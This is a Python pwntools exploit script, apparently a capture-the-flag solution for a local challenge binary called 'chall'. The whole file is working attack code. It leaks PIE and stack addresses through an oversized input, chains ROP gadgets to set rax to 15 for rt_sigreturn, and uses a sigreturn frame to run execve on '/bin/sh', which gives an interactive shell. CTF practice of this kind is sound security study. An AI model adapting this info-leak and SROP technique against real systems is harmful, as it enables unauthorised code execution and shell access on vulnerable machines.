from pwn import *

elf = ELF('./chall', checksec=False)
context.arch = 'amd64'
global p


def send_data(size, data):
    p.sendlineafter(b"Enter the length of the string (in decimal) > ", size)
    p.sendlineafter(b"Enter the string to cut > ", data)
    return p.recvuntil(b"---", drop=True)


p = process(elf.path)


leak  = send_data(b"10000", b"1")
pie   = u64(leak[496:][:8])
stack = u64(leak[416:][:8])

elf.address = pie - 4145


info("pie @ 0x%hx" % elf.address)
info("stack @ 0x%hx" % stack)

#0x000000000000100c : inc al ; ret
#0x0000000000001034 : syscall ; ret
#0x0000000000001000 : xor rax, rax ; ret

xor_rax = 0x0000000000001000 + elf.address
syscall = 0x0000000000001034 + elf.address
inc_al  = 0x000000000000100c + elf.address

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = stack-552          # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = syscall


payload = b"/bin/sh\0" + b"A"*512
payload += p64(xor_rax)
payload += p64(inc_al)*15
payload += p64(syscall)
payload += bytes(frame)

p.sendlineafter(b"Enter the length of the string (in decimal) > ", b"1000")
p.sendlineafter(b"Enter the string to cut > ", payload)



p.interactive()


